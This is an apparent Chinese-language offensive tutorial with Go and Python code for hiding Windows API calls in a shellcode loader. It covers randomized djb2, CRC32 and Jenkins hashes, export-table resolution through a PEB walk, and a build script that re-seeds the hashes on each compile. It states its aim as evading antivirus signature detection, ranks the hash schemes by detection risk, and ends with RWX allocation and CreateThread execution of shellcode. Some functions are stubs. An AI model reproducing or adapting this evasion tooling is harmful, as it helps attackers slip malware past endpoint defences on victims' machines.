# API Hash随机化技术

## 1. API Hash原理

**原理：**
- 使用哈希值代替API名称字符串
- 避免导入表中暴露敏感API名称
- 防止静态分析发现API调用

**问题：**
- 传统ROR13哈希已被杀软特征检测
- 需要使用随机化或多样化哈希算法

---

## 2. 传统ROR13 Hash（已过时）

```go
// ROR13哈希（已被特征检测）
// 这里的代码仅供参考，不建议使用
func ror13Hash(s string) uint32 {
    var hash uint32 = 0
    for _, c := range s {
        hash = ror(hash, 13)
        hash += uint32(c)
    }
    return hash
}

func ror(val uint32, n uint32) uint32 {
    return (val >> n) | (val << (32 - n))
}
```

---

## 3. 随机化Hash算法

### 3.1 Djb2随机化

```go
package main

import (
    "math/rand"
    "time"
    "unsafe"
)

// Djb2基础版本
func djb2Hash(s string) uint32 {
    var hash uint32 = 5381
    for _, c := range s {
        hash = ((hash << 5) + hash) + uint32(c) // hash * 33 + c
    }
    return hash
}

// Djb2随机化版本（使用随机种子）
func djb2HashRandomized(s string, seed uint32) uint32 {
    // 使用随机种子代替固定值5381
    var hash uint32 = seed
    for _, c := range s {
        hash = ((hash << 5) + hash) + uint32(c)
    }
    return hash
}

// 生成随机种子
func generateRandomSeed() uint32 {
    rand.Seed(time.Now().UnixNano())
    return rand.Uint32()
}

// 计算API哈希（编译时使用）
func calculateAPIHash(apiName string) uint32 {
    seed := generateRandomSeed()
    return djb2HashRandomized(apiName, seed)
}

// 预计算的API哈希表（使用随机种子）
type APIHashTable struct {
    Seed uint32
    Hashes map[string]uint32
}

// 创建API哈希表
func createAPIHashTable() APIHashTable {
    seed := generateRandomSeed()

    sensitiveAPIs := []string{
        "VirtualAlloc",
        "VirtualProtect",
        "VirtualFree",
        "CreateThread",
        "CreateRemoteThread",
        "OpenProcess",
        "WriteProcessMemory",
        "ReadProcessMemory",
        "QueueUserAPC",
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "RtlMoveMemory",
        "LoadLibraryA",
        "GetProcAddress",
    }

    hashes := make(map[string]uint32)
    for _, api := range sensitiveAPIs {
        hashes[api] = djb2HashRandomized(api, seed)
    }

    return APIHashTable{Seed: seed, Hashes: hashes}
}
```

### 3.2 CRC32随机化

```go
// CRC32随机化版本
func crc32HashRandomized(s string, seed uint32) uint32 {
    // 使用自定义多项式代替标准0xEDB88320
    poly := seed ^ 0xEDB88320 // 随机化多项式

    var crc uint32 = 0xFFFFFFFF
    for _, c := range s {
        crc ^= uint32(c)
        for i := 0; i < 8; i++ {
            if crc&1 != 0 {
                crc = (crc >> 1) ^ poly
            } else {
                crc >>= 1
            }
        }
    }
    return crc ^ 0xFFFFFFFF
}
```

### 3.3 组合哈希算法

```go
// 组合多个哈希算法（更难被特征检测）
func combinedHash(s string, seed1 uint32, seed2 uint32, seed3 uint32) uint32 {
    h1 := djb2HashRandomized(s, seed1)
    h2 := crc32HashRandomized(s, seed2)
    h3 := jenkinsHashRandomized(s, seed3)

    // 组合三个哈希值
    return h1 ^ (h2 << 16) ^ (h3 >> 16)
}

// Jenkins随机化版本
func jenkinsHashRandomized(s string, seed uint32) uint32 {
    var hash uint32 = seed // 使用随机种子代替固定值0
    for _, c := range s {
        hash += uint32(c)
        hash += hash << 10
        hash ^= hash >> 6
    }
    hash += hash << 3
    hash ^= hash >> 11
    hash += hash << 15
    return hash
}
```

### 3.4 动态种子哈希

```go
// 动态种子：每次编译使用不同的种子
// 在编译脚本中生成种子并嵌入代码

// 编译脚本示例（Python）:
/*
import random

seed = random.randint(0, 0xFFFFFFFF)

# 生成API哈希代码
api_hashes = {
    "VirtualAlloc": djb2_hash("VirtualAlloc", seed),
    "VirtualProtect": djb2_hash("VirtualProtect", seed),
    # ...
}

# 写入Go代码模板
go_code = f'''
const API_HASH_SEED = {seed}
const HASH_VIRTUALALLOC = {api_hashes["VirtualAlloc"]}
const HASH_VIRTUALPROTECT = {api_hashes["VirtualProtect"]}
'''
*/
```

---

## 4. PEB Walk + Hash组合

```go
// 使用随机化Hash通过导出表获取API地址
func getProcAddressByHash(moduleBase uintptr, targetHash uint32, seed uint32) uintptr {
    // 解析PE导出表
    dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(moduleBase))
    ntHeader := (*IMAGE_NT_HEADERS)(unsafe.Pointer(moduleBase + uintptr(dosHeader.E_lfanew)))

    exportRVA := ntHeader.OptionalHeader.DataDirectory[0].VirtualAddress
    if exportRVA == 0 {
        return 0
    }

    exportDir := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(moduleBase + uintptr(exportRVA)))

    namesAddr := moduleBase + uintptr(exportDir.AddressOfNames)
    ordinalsAddr := moduleBase + uintptr(exportDir.AddressOfNameOrdinals)
    functionsAddr := moduleBase + uintptr(exportDir.AddressOfFunctions)

    for i := uint32(0); i < exportDir.NumberOfNames; i++ {
        nameRVA := *(*uint32)(unsafe.Pointer(namesAddr + uintptr(i*4)))
        name := readCString(moduleBase + uintptr(nameRVA))

        // 计算哈希并比对
        hash := djb2HashRandomized(name, seed)
        if hash == targetHash {
            ordinal := *(*uint16)(unsafe.Pointer(ordinalsAddr + uintptr(i*2)))
            funcRVA := *(*uint32)(unsafe.Pointer(functionsAddr + uintptr(ordinal*4)))
            return moduleBase + uintptr(funcRVA)
        }
    }

    return 0
}

// 初始化所有API
func initAPIsByHash(seed uint32, hashes map[string]uint32) {
    kernel32Base := getModuleHandleByPEB("kernel32.dll")
    ntdllBase := getModuleHandleByPEB("ntdll.dll")

    pVirtualAlloc = getProcAddressByHash(kernel32Base, hashes["VirtualAlloc"], seed)
    pVirtualProtect = getProcAddressByHash(kernel32Base, hashes["VirtualProtect"], seed)
    pCreateThread = getProcAddressByHash(kernel32Base, hashes["CreateThread"], seed)

    pNtAllocateVirtualMemory = getProcAddressByHash(ntdllBase, hashes["NtAllocateVirtualMemory"], seed)
}
```

---

## 5. 编译时哈希计算脚本

```python
#!/usr/bin/env python3
"""
generate_api_hashes.py
生成随机化API哈希值
"""

import random
import sys

def djb2_hash(s, seed):
    hash = seed
    for c in s:
        hash = ((hash << 5) + hash) + ord(c)
        hash &= 0xFFFFFFFF  # 限制为32位
    return hash

def generate_hashes(seed):
    apis = [
        "VirtualAlloc",
        "VirtualProtect",
        "VirtualFree",
        "CreateThread",
        "CreateRemoteThread",
        "OpenProcess",
        "WriteProcessMemory",
        "ReadProcessMemory",
        "QueueUserAPC",
        "RtlMoveMemory",
        "LoadLibraryA",
        "GetProcAddress",
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtOpenProcess",
        "NtQueueApcThreadEx2",
    ]

    hashes = {}
    for api in apis:
        hashes[api] = djb2_hash(api, seed)

    return hashes

def generate_go_code(seed, hashes):
    code = f"""// API哈希定义（随机种子: {seed}）
const API_HASH_SEED = {seed}

var (
    HASH_VIRTUALALLOC           = {hashes["VirtualAlloc"]}
    HASH_VIRTUALPROTECT         = {hashes["VirtualProtect"]}
    HASH_VIRTUALFREE            = {hashes["VirtualFree"]}
    HASH_CREATETHREAD           = {hashes["CreateThread"]}
    HASH_CREATEREMOTETHREAD     = {hashes["CreateRemoteThread"]}
    HASH_OPENPROCESS            = {hashes["OpenProcess"]}
    HASH_WRITEPROCESSMEMORY     = {hashes["WriteProcessMemory"]}
    HASH_QUEUEUSERAPC           = {hashes["QueueUserAPC"]}
    HASH_RTLMOVEMEMORY          = {hashes["RtlMoveMemory"]}
    HASH_NTALLOCATEVIRTUALMEM   = {hashes["NtAllocateVirtualMemory"]}
    HASH_NTWRITEVIRTUALMEM      = {hashes["NtWriteVirtualMemory"]}
    HASH_NTPROTECTVIRTUALMEM    = {hashes["NtProtectVirtualMemory"]}
    HASH_NTCREATETHREADEX       = {hashes["NtCreateThreadEx"]}
)
"""
    return code

if __name__ == "__main__":
    # 生成随机种子
    seed = random.randint(0, 0xFFFFFFFF)
    print(f"Generated seed: {seed}")

    # 计算哈希
    hashes = generate_hashes(seed)

    # 输出Go代码
    go_code = generate_go_code(seed, hashes)
    print(go_code)

    # 写入文件
    with open("api_hashes.go", "w") as f:
        f.write(go_code)
```

---

## 6. 完整使用示例

```go
package main

import (
    "golang.org/x/sys/windows"
    "syscall"
    "unsafe"
)

// 编译时生成的哈希定义
const API_HASH_SEED = 0xA7B3C9D1 // 随机种子（每次编译不同）

var (
    HASH_VIRTUALALLOC = 0x12345678 // 预计算
    HASH_CREATETHREAD = 0x23456789 // 预计算
)

// 获取模块基址（PEB Walk）
func getModuleHandleByPEB(moduleName string) uintptr {
    // 实现见iat_hiding.md
    return 0
}

// 获取API地址（随机化Hash）
func getAPIByRandomizedHash(moduleBase uintptr, hash uint32) uintptr {
    // 遍历导出表，使用随机化Hash比对
    return 0
}

// 初始化API
func initAPIs() {
    kernel32Base := getModuleHandleByPEB("kernel32.dll")

    pVirtualAlloc = getAPIByRandomizedHash(kernel32Base, HASH_VIRTUALALLOC)
    pCreateThread = getAPIByRandomizedHash(kernel32Base, HASH_CREATETHREAD)
}

// 执行shellcode
func executeShellcode(sc []byte) {
    initAPIs()

    // 分配内存
    addr, _, _ := syscall.SyscallN(pVirtualAlloc, 0, uintptr(len(sc)), 0x3000, 0x40)

    // 复制shellcode（使用RtlMoveMemory）
    syscall.SyscallN(pRtlMoveMemory, addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

    // 【必须】创建线程执行shellcode（不能直接syscall.SyscallN(addr)）
    thread, _, _ := syscall.SyscallN(pCreateThread, 0, 0, addr, 0, 0, 0)
    syscall.SyscallN(pWaitForSingleObject, thread, 0xFFFFFFFF)
}
```

---

## 7. 注意事项

1. **种子随机性**：每次编译使用不同的随机种子
2. **哈希计算**：编译时计算哈希，运行时只比对
3. **避免ROR13**：不要使用ROR13，已被特征检测
4. **多种算法**：可以组合多个哈希算法增加复杂度
5. **种子嵌入**：种子值需要嵌入代码，注意保护
6. **性能优化**：导出表遍历可能耗时，考虑缓存

---

## 8. Hash算法对比

| 算法 | 特征检测风险 | 推荐度 |
|------|-------------|--------|
| ROR13 | 高（已过时） | 不推荐 |
| Djb2（固定种子） | 中 | 不推荐 |
| Djb2（随机种子） | 低 | 推荐 |
| CRC32（随机化） | 低 | 推荐 |
| Jenkins（随机化） | 低 | 推荐 |
| 组合Hash | 极低 | 强烈推荐 |

---

## 9. 自动化集成

将Hash生成脚本集成到编译流程：

```bash
# 每次编译前生成新的API哈希
python generate_api_hashes.py > api_hashes.go

# 编译
go build -ldflags "-s -w" loader.go
```